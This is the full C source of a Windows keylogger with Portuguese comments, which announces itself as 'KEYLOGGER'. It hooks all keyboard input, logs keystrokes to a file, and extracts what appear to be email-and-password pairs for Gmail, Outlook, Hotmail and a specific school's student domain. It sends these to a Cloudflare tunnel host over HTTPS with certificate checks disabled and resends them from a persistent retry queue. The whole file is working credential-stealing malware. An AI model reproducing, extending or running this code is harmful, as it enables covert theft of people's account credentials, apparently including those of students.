#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <wctype.h>
#include <wchar.h>
#include <string.h>
#include <winhttp.h>
#include <time.h>

int enviarViaHTTP(const char* dados);
void processarFilaPendencias();

#pragma comment(lib, "winhttp.lib")

HHOOK hKeyboardHook;

// Configuração do servidor
#define SERVER_HOST L"https://quotations-tramadol-dealing-strip.trycloudflare.com"
#define SERVER_PORT 443
#define SERVER_PATH L"/envio"
#define USE_HTTPS 1

// Estrutura para tracking de linhas enviadas
typedef struct LinhaEnviada {
    wchar_t* texto;
    struct LinhaEnviada* prox;
} LinhaEnviada;

LinhaEnviada* linhasEnviadas = NULL;
CRITICAL_SECTION csLinhasEnviadas;

// Estrutura para fila de pendências
typedef struct Pendencia {
    char* dados;
    time_t timestamp;
    struct Pendencia* prox;
} Pendencia;

Pendencia* filaPendencias = NULL;
CRITICAL_SECTION csFilaPendencias;

// Variável global para controle de conexão
int conexaoDisponivel = 0;

// Função para verificar se linha já foi enviada
int linhaJaEnviada(const wchar_t* linha) {
    EnterCriticalSection(&csLinhasEnviadas);

    LinhaEnviada* atual = linhasEnviadas;
    while (atual != NULL) {
        if (wcscmp(atual->texto, linha) == 0) {
            LeaveCriticalSection(&csLinhasEnviadas);
            return 1;
        }
        atual = atual->prox;
    }

    LeaveCriticalSection(&csLinhasEnviadas);
    return 0;
}

// Função para adicionar linha ao tracking
void adicionarLinhaEnviada(const wchar_t* linha) {
    EnterCriticalSection(&csLinhasEnviadas);

    LinhaEnviada* nova = (LinhaEnviada*)malloc(sizeof(LinhaEnviada));
    if (nova != NULL) {
        nova->texto = (wchar_t*)malloc((wcslen(linha) + 1) * sizeof(wchar_t));
        if (nova->texto != NULL) {
            wcscpy(nova->texto, linha);
            nova->prox = linhasEnviadas;
            linhasEnviadas = nova;
        } else {
            free(nova);
        }
    }

    LeaveCriticalSection(&csLinhasEnviadas);
}

// Função para remover linhas já enviadas do dados_filtrados.txt
void limparLinhasEnviadasDoArquivo() {
    FILE* arquivo = _wfopen(L"dados_filtrados.txt", L"r, ccs=UTF-8");
    if (arquivo == NULL) return;
    
    // Ler todo conteúdo
    fseek(arquivo, 0, SEEK_END);
    long tamanho = ftell(arquivo);
    fseek(arquivo, 0, SEEK_SET);
    
    wchar_t* conteudo = (wchar_t*)malloc(tamanho + 2);
    if (conteudo == NULL) {
        fclose(arquivo);
        return;
    }
    
    fread(conteudo, sizeof(wchar_t), tamanho / sizeof(wchar_t), arquivo);
    conteudo[tamanho / sizeof(wchar_t)] = L'\0';
    fclose(arquivo);
    
    // Abrir para escrita
    FILE* novoArquivo = _wfopen(L"dados_filtrados_temp.txt", L"w, ccs=UTF-8");
    if (novoArquivo == NULL) {
        free(conteudo);
        return;
    }
    
    // Filtrar linhas não enviadas
    wchar_t* linha = wcstok(conteudo, L"\n");
    while (linha != NULL) {
        if (!linhaJaEnviada(linha)) {
            fwprintf(novoArquivo, L"%s\n", linha);
        }
        linha = wcstok(NULL, L"\n");
    }
    
    fclose(novoArquivo);
    free(conteudo);
    
    // Substituir arquivo
    DeleteFileW(L"dados_filtrados.txt");
    MoveFileW(L"dados_filtrados_temp.txt", L"dados_filtrados.txt");
}

// Função para salvar pendência em arquivo
void salvarPendenciasEmArquivo() {
    EnterCriticalSection(&csFilaPendencias);

    FILE* arquivo = fopen("pendencias.txt", "w");
    if (arquivo != NULL) {
        Pendencia* atual = filaPendencias;
        while (atual != NULL) {
            fprintf(arquivo, "%ld|%s\n", (long)atual->timestamp, atual->dados);
            atual = atual->prox;
        }
        fclose(arquivo);
        printf("[PENDENCIA] Pendências salvas em arquivo\n");
    }

    LeaveCriticalSection(&csFilaPendencias);
}

// Função para carregar pendências do arquivo
void carregarPendenciasDoArquivo() {
    FILE* arquivo = fopen("pendencias.txt", "r");
    if (arquivo == NULL) return;

    printf("[INIT] Carregando pendências do arquivo...\n");

    char linha[2048];
    int count = 0;

    while (fgets(linha, sizeof(linha), arquivo) != NULL) {
        // Remover newline
        linha[strcspn(linha, "\n")] = 0;

        // Formato: timestamp|dados
        char* pipe = strchr(linha, '|');
        if (pipe != NULL) {
            *pipe = '\0';
            long timestamp = atol(linha);
            char* dados = pipe + 1;

            // Adicionar à fila
            Pendencia* nova = (Pendencia*)malloc(sizeof(Pendencia));
            if (nova != NULL) {
                nova->dados = _strdup(dados);
                nova->timestamp = (time_t)timestamp;
                nova->prox = filaPendencias;
                filaPendencias = nova;
                count++;
            }
        }
    }

    fclose(arquivo);
    printf("[INIT] Carregadas %d pendências do arquivo\n", count);

    // Tentar enviar pendências imediatamente
    if (count > 0) {
        processarFilaPendencias();
    }
}

// Função para adicionar à fila de pendências
void adicionarPendencia(const char* dados) {
    EnterCriticalSection(&csFilaPendencias);

    Pendencia* nova = (Pendencia*)malloc(sizeof(Pendencia));
    if (nova != NULL) {
        nova->dados = _strdup(dados);
        nova->timestamp = time(NULL);
        nova->prox = filaPendencias;
        filaPendencias = nova;
        printf("[PENDENCIA] Adicionado à fila: %s\n", dados);
    }

    // Salvar imediatamente no arquivo
    salvarPendenciasEmArquivo();

    LeaveCriticalSection(&csFilaPendencias);
}

// Função para remover da fila de pendências (quando enviado com sucesso)
void removerPendencia(const char* dados) {
    EnterCriticalSection(&csFilaPendencias);

    Pendencia* atual = filaPendencias;
    Pendencia* anterior = NULL;

    while (atual != NULL) {
        if (strcmp(atual->dados, dados) == 0) {
            if (anterior == NULL) {
                filaPendencias = atual->prox;
            } else {
                anterior->prox = atual->prox;
            }
            free(atual->dados);
            free(atual);
            printf("[PENDENCIA] Removido da fila: %s\n", dados);
            break;
        }
        anterior = atual;
        atual = atual->prox;
    }

    // Atualizar arquivo
    salvarPendenciasEmArquivo();

    LeaveCriticalSection(&csFilaPendencias);
}

// Função para processar toda a fila de pendências
void processarFilaPendencias() {
    EnterCriticalSection(&csFilaPendencias);

    Pendencia* atual = filaPendencias;
    Pendencia* proximo;
    int enviados = 0;
    int falhas = 0;
    int count = 0;
    
    // Contar pendências
    Pendencia* temp = filaPendencias;
    while (temp != NULL) {
        count++;
        temp = temp->prox;
    }

    printf("[FILA] Processando %d pendências...\n", count);

    while (atual != NULL) {
        proximo = atual->prox;

        printf("[FILA] Tentando enviar pendência: %s\n", atual->dados);

        if (enviarViaHTTP(atual->dados) == 0) {
            printf("[FILA] Pendência enviada com sucesso!\n");
            enviados++;

            // Remover da fila (precisa sair da critical section para remover)
            LeaveCriticalSection(&csFilaPendencias);
            removerPendencia(atual->dados);
            EnterCriticalSection(&csFilaPendencias);
        } else {
            printf("[FILA] Falha ao enviar pendência\n");
            falhas++;
        }

        atual = proximo;
    }

    printf("[FILA] Processamento concluído: %d enviados, %d falhas\n",
           enviados, falhas);

    LeaveCriticalSection(&csFilaPendencias);
    
    // Após processar pendências, limpar linhas já enviadas do arquivo
    limparLinhasEnviadasDoArquivo();
}

// Função para enviar dados via HTTP/HTTPS POST
int enviarViaHTTP(const char* dados) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;
    int timeout = 5000; // 5 segundos de timeout

    DWORD dwFlags = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;

    hSession = WinHttpOpen(L"KeyLogger/1.0", dwFlags,
                          WINHTTP_NO_PROXY_NAME,
                          WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession) {
        // Configurar timeouts
        WinHttpSetTimeouts(hSession, timeout, timeout, timeout, timeout);

        if (USE_HTTPS) {
            DWORD dwSecurityFlags =
                SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

            WinHttpSetOption(hSession, WINHTTP_OPTION_SECURITY_FLAGS,
                           &dwSecurityFlags, sizeof(dwSecurityFlags));
        }

        hConnect = WinHttpConnect(hSession, SERVER_HOST, SERVER_PORT, 0);

        if (hConnect) {
            hRequest = WinHttpOpenRequest(hConnect, L"POST", SERVER_PATH,
                                         NULL, NULL, NULL,
                                         USE_HTTPS ? WINHTTP_FLAG_SECURE : 0);

            if (hRequest) {
                LPCWSTR headers = L"Content-Type: application/json\r\n";

                char body[2048];
                char escaped_dados[1024];
                int j = 0;
                for (int i = 0; dados[i] != '\0' && j < sizeof(escaped_dados) - 1; i++) {
                    if (dados[i] == '"' || dados[i] == '\\') {
                        escaped_dados[j++] = '\\';
                    }
                    escaped_dados[j++] = dados[i];
                }
                escaped_dados[j] = '\0';

                snprintf(body, sizeof(body), "{\"texto\":\"%s\"}", escaped_dados);

                bResults = WinHttpSendRequest(hRequest, headers, wcslen(headers),
                                            (LPVOID)body, strlen(body),
                                            strlen(body), 0);

                if (bResults) {
                    bResults = WinHttpReceiveResponse(hRequest, NULL);
                }

                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }

    return bResults ? 0 : -1;
}

// Função para converter wchar_t para char (UTF-8)
char* wcharToUTF8(const wchar_t* wstr) {
    if (wstr == NULL) return NULL;

    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    char* utf8_str = (char*)malloc(size_needed);

    if (utf8_str) {
        WideCharToMultiByte(CP_UTF8, 0, wstr, -1, utf8_str, size_needed, NULL, NULL);
    }

    return utf8_str;
}

// Função auxiliar para resolver o problema de Dead Keys (Acentos) no Windows
int GetUnicodeCharFromHook(KBDLLHOOKSTRUCT *pKeyBoard, WCHAR *buffer) {
    BYTE keystate[256] = {0};

    if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
        keystate[VK_SHIFT] = 0x80;

    if (GetKeyState(VK_CAPITAL) & 0x0001)
        keystate[VK_CAPITAL] = 0x01;

    if (GetAsyncKeyState(VK_MENU) & 0x8000)
        keystate[VK_MENU] = 0x80;

    if (GetAsyncKeyState(VK_CONTROL) & 0x8000)
        keystate[VK_CONTROL] = 0x80;

    DWORD threadId = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
    HKL layout = GetKeyboardLayout(threadId);

    int result = ToUnicodeEx(pKeyBoard->vkCode, pKeyBoard->scanCode, keystate, buffer, 5, 0, layout);

    if (result == -1) {
        WCHAR tempBuf[5];
        ToUnicodeEx(VK_SPACE, MapVirtualKeyW(VK_SPACE, MAPVK_VK_TO_VSC), keystate, tempBuf, 5, 0, layout);
    }

    return result;
}

// Função para processar e enviar novas linhas
void ProcessarEEnviarLinhas(const wchar_t* conteudo) {
    if (conteudo == NULL) return;

    wchar_t* buffer = (wchar_t*)malloc((wcslen(conteudo) + 1) * sizeof(wchar_t));
    if (buffer == NULL) return;

    wcscpy(buffer, conteudo);
    wchar_t* p = buffer;

    while (*p != L'\0') {
        while (*p == L'\n' || *p == L'\r') p++;
        if (*p == L'\0') break;

        wchar_t* inicioLinha = p;

        while (*p != L'\0' && *p != L'\n' && *p != L'\r') p++;
        wchar_t* fimLinha = p;

        size_t len = fimLinha - inicioLinha;
        if (len > 0) {
            wchar_t* linha = (wchar_t*)malloc((len + 1) * sizeof(wchar_t));
            if (linha != NULL) {
                wcsncpy(linha, inicioLinha, len);
                linha[len] = L'\0';

                if (wcsstr(linha, L"][") != NULL && wcsstr(linha, L"@") != NULL) {
                    if (!linhaJaEnviada(linha)) {
                        char* linhaUTF8 = wcharToUTF8(linha);
                        if (linhaUTF8 != NULL) {
                            printf("Enviando: %ls\n", linha);

                            // Tentar enviar
                            int resultado = enviarViaHTTP(linhaUTF8);

                            if (resultado == 0) {
                                // Sucesso - marcar como enviado
                                adicionarLinhaEnviada(linha);
                                printf("Envio bem sucedido!\n");
                            } else {
                                // Falha - adicionar à fila de pendências
                                // NÃO marcar como enviado ainda
                                printf("Falha no envio! Adicionando à fila de pendências...\n");
                                adicionarPendencia(linhaUTF8);
                                // A linha permanece no arquivo para próxima tentativa
                            }

                            free(linhaUTF8);
                        }
                    } else {
                        printf("Linha já enviada anteriormente: %ls\n", linha);
                    }
                }
                free(linha);
            }
        }
    }

    free(buffer);
}

// Atualiza dados_filtrados.txt e processa envio
void AtualizarArquivoFiltrado() {
    FILE *arqvOrigem = _wfopen(L"dados.txt", L"r, ccs=UTF-8");
    if (arqvOrigem == NULL) return;

    size_t bufSize = 65536;
    wchar_t *conteudo = (wchar_t *)malloc(bufSize * sizeof(wchar_t));

    if (conteudo == NULL) {
        fclose(arqvOrigem);
        return;
    }

    size_t totalLidos = 0;
    wchar_t ch;

    while ((ch = fgetwc(arqvOrigem)) != WEOF && totalLidos < bufSize - 1) {
        conteudo[totalLidos++] = ch;
    }
    conteudo[totalLidos] = L'\0';
    fclose(arqvOrigem);

    FILE *arqvDestino = _wfopen(L"dados_filtrados.txt", L"a, ccs=UTF-8");
    if (arqvDestino == NULL) {
        free(conteudo);
        return;
    }

    wchar_t *p = conteudo;
    wchar_t* linhasParaEnviar = (wchar_t*)calloc(bufSize, sizeof(wchar_t));
    size_t linhasPos = 0;

    while (*p != L'\0') {
        while (*p == L' ' || *p == L'\n' || *p == L'\r' || *p == L'\t') {
            p++;
        }

        if (*p == L'\0') break;

        wchar_t *inicio1 = p;
        while (*p != L'\0' && *p != L' ' && *p != L'\n' && *p != L'\r' && *p != L'\t') {
            p++;
        }

        wchar_t *fim1 = p;
        size_t len1 = fim1 - inicio1;

        wchar_t palavra1[512];
        wcsncpy(palavra1, inicio1, len1);
        palavra1[len1] = L'\0';

        if (palavra1[0] == L't') {
            memmove(palavra1, palavra1 + 1, wcslen(palavra1) * sizeof(wchar_t));
        }

        if (wcsstr(palavra1, L"@gmail.com") != NULL ||
            wcsstr(palavra1, L"@estudante.ifms.edu.br") != NULL ||
            wcsstr(palavra1, L"@outlook.com") != NULL ||
            wcsstr(palavra1, L"@hotmail.com") != NULL) {

            while (*p == L' ' || *p == L'\n' || *p == L'\r' || *p == L'\t') {
                p++;
            }

            if (*p != L'\0') {
                wchar_t *inicio2 = p;
                while (*p != L'\0' && *p != L' ' && *p != L'\n' && *p != L'\r' && *p != L'\t') {
                    p++;
                }

                wchar_t *fim2 = p;
                size_t len2 = fim2 - inicio2;

                fwprintf(arqvDestino, L"[%ls][%.*ls]\n", palavra1, (int)len2, inicio2);
                linhasPos += swprintf(linhasParaEnviar + linhasPos, bufSize - linhasPos, L"[%ls][%.*ls]\n", palavra1, (int)len2, inicio2);
            }
        }
    }

    fclose(arqvDestino);

    if (linhasPos > 0) {
        // Tentar enviar as linhas
        ProcessarEEnviarLinhas(linhasParaEnviar);
    }

    free(linhasParaEnviar);
    free(conteudo);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = pKeyBoard->vkCode;

        if (vkCode == VK_BACK) {
            FILE *arquivoLeitura = _wfopen(L"dados.txt", L"r, ccs=UTF-8");
            if (arquivoLeitura != NULL) {
                size_t bufferSize = 65536;
                wchar_t *texto = (wchar_t *)malloc(bufferSize * sizeof(wchar_t));
                size_t totalLidos = 0;
                wchar_t ch;

                while ((ch = fgetwc(arquivoLeitura)) != WEOF && totalLidos < bufferSize - 1) {
                    texto[totalLidos++] = ch;
                }
                texto[totalLidos] = L'\0';
                fclose(arquivoLeitura);

                if (totalLidos > 0) {
                    texto[totalLidos - 1] = L'\0';
                    FILE *arquivoEscrita = _wfopen(L"dados.txt", L"w, ccs=UTF-8");
                    if (arquivoEscrita != NULL) {
                        fputws(texto, arquivoEscrita);
                        fclose(arquivoEscrita);
                    }
                }
                free(texto);
            }
            AtualizarArquivoFiltrado();
            return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
        }

        WCHAR unicodeBuffer[5] = {0};
        int translationResult = GetUnicodeCharFromHook(pKeyBoard, unicodeBuffer);

        FILE *arquivo = _wfopen(L"dados.txt", L"a, ccs=UTF-8");
        if (arquivo != NULL) {
            if (translationResult > 0) {
                for (int i = 0; i < translationResult; i++) {
                    if (unicodeBuffer[i] >= 32 || unicodeBuffer[i] == L'\n' || unicodeBuffer[i] == L'\r') {
                        fputwc(unicodeBuffer[i], arquivo);
                    }
                }
            }
            else if (translationResult == 0) {
                if (vkCode == VK_RETURN) {
                    fwprintf(arquivo, L"\n");
                }
                else if (vkCode == VK_TAB) {
                    fwprintf(arquivo, L"\t");
                }
            }
            fclose(arquivo);
            AtualizarArquivoFiltrado();
        }
    }

    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Thread para tentar reenviar pendências periodicamente
DWORD WINAPI ThreadReenvio(LPVOID lpParam) {
    while (1) {
        Sleep(30000); // Espera 30 segundos

        printf("[THREAD] Verificando fila de pendências...\n");
        processarFilaPendencias();
    }
    return 0;
}

int main() {
    setlocale(LC_ALL, "");
    InitializeCriticalSection(&csLinhasEnviadas);
    InitializeCriticalSection(&csFilaPendencias);

    // Carregar pendências salvas anteriormente
    carregarPendenciasDoArquivo();

    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (hKeyboardHook == NULL) {
        printf("Erro ao instalar o hook! Erro: %d\n", GetLastError());
        DeleteCriticalSection(&csLinhasEnviadas);
        DeleteCriticalSection(&csFilaPendencias);
        return 1;
    }

    // Criar thread para reenvio automático
    HANDLE hThread = CreateThread(NULL, 0, ThreadReenvio, NULL, 0, NULL);

    printf("========================================\n");
    printf("KEYLOGGER COM FILA DE PENDENCIAS\n");
    printf("========================================\n");
    printf("Servidor: %S\n", SERVER_HOST);
    printf("Porta: %d (%s)\n", SERVER_PORT, USE_HTTPS ? "HTTPS" : "HTTP");
    printf("Caminho: %S\n", SERVER_PATH);
    printf("dados.txt -> bruto\n");
    printf("dados_filtrados.txt -> filtrado\n");
    printf("pendencias.txt -> fila de dados não enviados\n");
    printf("========================================\n");
    printf("[INFO] Dados não enviados serão salvos em pendencias.txt\n");
    printf("[INFO] Tentativas de reenvio a cada 30 segundos\n");
    printf("[INFO] Linhas só são removidas do arquivo quando enviadas com sucesso\n");
    printf("========================================\n\n");

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);

    // Finalizar thread
    TerminateThread(hThread, 0);
    CloseHandle(hThread);

    // Salvar pendências restantes
    salvarPendenciasEmArquivo();

    // Limpar lista de linhas enviadas
    LinhaEnviada* atual = linhasEnviadas;
    while (atual != NULL) {
        LinhaEnviada* prox = atual->prox;
        free(atual->texto);
        free(atual);
        atual = prox;
    }

    // Limpar fila de pendências
    Pendencia* pendAtual = filaPendencias;
    while (pendAtual != NULL) {
        Pendencia* prox = pendAtual->prox;
        free(pendAtual->dados);
        free(pendAtual);
        pendAtual = prox;
    }

    DeleteCriticalSection(&csLinhasEnviadas);
    DeleteCriticalSection(&csFilaPendencias);

    return 0;
}

